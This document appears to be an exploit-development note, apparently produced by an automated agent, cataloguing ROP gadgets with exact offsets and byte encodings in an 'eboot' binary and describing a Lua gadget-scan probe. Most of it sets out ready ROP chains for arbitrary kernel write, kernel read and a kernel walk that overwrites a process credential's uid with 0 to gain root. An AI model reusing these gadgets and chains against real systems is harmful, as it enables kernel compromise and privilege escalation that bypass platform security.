# ROP Gadget Catalog and Expansion

**Date:** 2026-10-25
**Source:** Agent 10 -- Gadget catalog analysis + scan probe (max effort)

## Confirmed Gadgets

| Gadget | Offset | Encoding |
|--------|--------|----------|
| pop rax; ret | eboot+0x992 | 58 C3 |
| pop rdi; ret | eboot+0xC9DFE | 5F C3 |
| pop rsi; ret | eboot+0xD77D | 5E C3 |
| pop rdx; ret | eboot+0x3B02D7 | 5A C3 |
| pop rcx; ret | eboot+0xE64 | 59 C3 |
| pop rdi; pop rbp; ret | eboot+0x169 | 5F 5D C3 |
| pop rsi; pop rbp; ret | eboot+0x78 | 5E 5D C3 |
| bare ret | eboot+0x42 | C3 |
| mov [rdi], rax; ret | eboot+0x92C67 | 48 89 07 C3 |
| pop rsp; ret | eboot+0x9A2 | 5C C3 |
| rax=0 gadget | eboot+0x471 | (xor eax, eax; ret) |
| rax=1 gadget | eboot+0x1AB0C6 | |
| rax=6 gadget | eboot+0xCEF50 | |
| rax=7 gadget | eboot+0xDBF50 | |
| rax=8 gadget | eboot+0x8D2D4 | |

**Not found:** pop r8, pop r9, mov r8, mov r9 (confirmed absent in full 4.6MB scan, probes 272a/386a). Max 4 controlled syscall args.

## Existing Offset-Read Gadgets (from probe 118b)

| Gadget | Offset | Notes |
|--------|--------|-------|
| mov rax, [rdi+0x18]; ret | eboot+0x5D940 | 48 8B 47 18 C3 |
| mov rax, [rdi+0x10]; ret | eboot+0xD68A0 | 48 8B 47 10 C3 |

These are **kernel read gadgets** -- compute `target_addr - N` in Lua, load into rdi, execute the gadget to read from kernel memory.

## Scan Probe Written

A 195-line gadget scan probe was created at `probes/phase16_kwrite/68a_full_gadget_catalog.lua`. It searches the full 4.6MB eboot .text with 5 pattern families:

- **[A] 22 fixed 4-byte dword patterns:** mov rax,[rdi]/[rsi]/[rax]/[rdx];ret, mov [rdi]/[rsi]/[rdx],rax;ret, mov [rax],rdi;ret, add/and [rdi],rax;ret, mov rdi/rsi/rdx/rcx,rax;ret, xchg rax,rdi, add/sub rax,rdi;ret, neg/not rax;ret
- **[B] 8 three-byte patterns:** push rax;pop rdi;ret, xchg rax,rdi/rsi/rdx/rsp;ret, xor eax,eax;ret, mov eax,[rdi];ret, mov [rdi],eax;ret
- **[C] 5 two-byte patterns:** int 0x80, sysenter, pop rsp;ret, jmp rax, call rax
- **[D] 5-byte variable-displacement REX:** mov rax,[rdi+N];ret, mov [rdi+N],rax;ret, rsi variants (reports all displacement values N)
- **[E] 4-byte variable-displacement non-REX:** mov eax,[rdi+N];ret, mov [rdi+N],eax;ret (32-bit R/W at arbitrary offset)

## Critical Missing Gadgets

### Priority 1: Kernel Read -- mov rax, [rdi]; ret

The single most critical gap for direct reads. However, **the offset variants at +0x18 and +0x10 serve as workarounds** -- compute `target_addr - offset` in Lua.

### Priority 2: Register Chaining -- mov rdi, rax; ret

Needed for multi-step kernel operations (read a pointer, use it to read the next field). Without it, each dependent read requires a round-trip through shared memory.

**Workarounds:**
- `push rax; pop rdi; ret` (50 5F C3) -- achieves the same via stack
- `xchg rax, rdi; ret` (48 97 C3) -- swaps both registers
- Separate child threads for each step -- slower but guaranteed

### Priority 3: In-place Writes -- add [rdi], rax; ret

For incrementing reference counts or modifying kernel fields arithmetically.

**Workaround:** Read current value, compute new value in Lua, overwrite with `mov [rdi], rax; ret`.

### Priority 4: Stack Pivot -- pop rsp; ret

Already confirmed at eboot+0x9A2. Enables arbitrarily long chains by pivoting to a new stack.

## Exploitation Chains

### Kernel Write (works NOW)

```
pop rdi; ret       -> rdi = kernel_target_addr
pop rax; ret       -> rax = value_to_write
mov [rdi], rax; ret -> *(kernel_addr) = value
pop rax; ret       -> rax = 431 (thr_exit)
<fn_addr syscall>  -> exit child
```

### Kernel Read (requires one offset-read gadget -- FOUND)

```
pop rdi; ret              -> rdi = kernel_addr - 0x18
mov rax, [rdi+0x18]; ret  -> rax = *(kernel_addr)
pop rdi; ret              -> rdi = shared_page_addr
mov [rdi], rax; ret       -> write kernel data to userland
pop rax; ret              -> rax = 431
<fn_addr syscall>         -> exit child
```

### Multi-Step Kernel Walk (with register chaining)

If `push rax; pop rdi; ret` is found by the scan:
```
pop rdi; ret              -> rdi = proc_addr - 0x18
mov rax, [rdi+0x18]; ret  -> rax = *(proc_addr) = ucred_ptr
push rax; pop rdi; ret    -> rdi = ucred_ptr
pop rax; ret              -> rax = 0  (root uid)
mov [rdi], rax; ret       -> ucred->cr_uid = 0
```

Without it, use two child threads:
- Child 1: read proc_addr -> shared_page, exit
- Lua reads shared_page, builds chain 2
- Child 2: write 0 to ucred->cr_uid, exit

## Why No r8/r9 Is Not a Blocker

Kernel R/W only needs rdi (target address) and rax (value). The 6-arg limitation affects sysctl from child threads but sysctl can still be called from the main thread via make_syscall.
